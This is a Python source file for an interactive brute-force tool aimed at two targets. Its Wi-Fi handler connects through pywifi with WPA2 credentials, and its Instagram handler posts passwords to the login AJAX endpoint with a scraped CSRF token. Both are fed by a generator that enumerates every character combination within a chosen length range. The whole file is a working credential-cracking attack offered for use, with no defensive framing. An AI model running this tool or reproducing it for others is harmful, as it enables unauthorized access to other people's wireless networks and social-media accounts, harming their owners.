import itertools
import time
import string
import pywifi
import requests

import re
import requests
from bs4 import BeautifulSoup

from datetime import datetime

class GenericHandler:
    def handle(self, *args, **kwargs):
        raise NotImplementedError("Subclasses must implement the 'handle' method.")

class WiFiHandler(GenericHandler):
    def __init__(self, iface):
        self.iface = iface

    def handle(self, ssid, password):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password

        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)
        time.sleep(2)

        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print("Connected to Wi-Fi.")
            return True
        else:
            return False

class InstagramHandler(GenericHandler):
    def handle(self, username, password):

        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',  # <-- note the '0' - that means we want to use plain passwords
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        s = requests.Session()
        r = s.get(link)
        csrf = re.findall(r"csrf_token\":\"(.*?)\"",r.text)[0]
        r = s.post(login_url,data=payload,headers={
            "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken":csrf
        })
        print(r.status_code)

        data = r.json()

  
        if (data['status'] == 'fail'):
            return False
        
        if (data['authenticated'] == True):
            return True #if we want to keep use session
        else:
            return False

class PasswordGenerator:
    def __init__(self):
        self.use_letters = False
        self.use_numbers = False
        self.use_special_chars = False
        self.max_length = 0
        self.min_length = 0
        self.all_chars = ''

    def get_user_input(self):
        self.use_letters = input("Include alphabets? (yes/no): ").lower() == 'yes'
        self.use_numbers = input("Include numbers? (yes/no): ").lower() == 'yes'
        self.use_special_chars = input("Include special characters? (yes/no): ").lower() == 'yes'
        self.max_length = int(input("Max length? "))
        self.min_length = int(input("Min length? "))

    def define_character_sets(self):
        letters = string.ascii_letters if self.use_letters else ''
        numbers = string.digits if self.use_numbers else ''
        special_chars = string.punctuation if self.use_special_chars else ''
        self.all_chars = letters + numbers + special_chars

    def generate_password(self):
        self.get_user_input()
        self.define_character_sets()

        if not self.all_chars:
            print("Please select at least one character type.")
            return

        for length in range(self.min_length, self.max_length + 1):
            for combination in itertools.product(self.all_chars, repeat=length):
                password = ''.join(combination)
                yield password

def main():
    # Instantiate the PasswordGenerator
    password_generator = PasswordGenerator()

    while True:
        print("\nSelect a service/system to bruteforce:")
        print("1. Wi-Fi")
        print("2. Instagram")
        print("0. Exit")

        choice = input("Enter your choice (0-2): ")

        if choice == "0":
            break
        elif choice == "1":
            wifi_handler = WiFiHandler(iface=None)  # Pass the appropriate arguments to the constructor
            handle_service(WiFiHandler, password_generator)
        elif choice == "2":
            instagram_handler = InstagramHandler()
            handle_service(InstagramHandler, password_generator)
        else:
            print("Invalid choice. Please enter a valid option.")

def handle_service(handler, password_generator):
    if handler == WiFiHandler:
        handler = WiFiHandler(None)
        from wifi import select_network
        ssid = select_network()
        for password in password_generator.generate_password():
            if handler.handle(ssid, password=password):
                print(f"Correct password found: {password}")
                break
            else:
                print(f"Trying password: {password}")
    
    if handler == InstagramHandler:
        handler = handler()
        username= input("Instagram username: ")
        for password in password_generator.generate_password():
            if handler.handle(username=username, password=password):
                print(f"Correct password found: {password}")
                break
            else:
                print(f"Trying password: {password}")
                time.sleep(1)

if __name__ == "__main__":
    main()
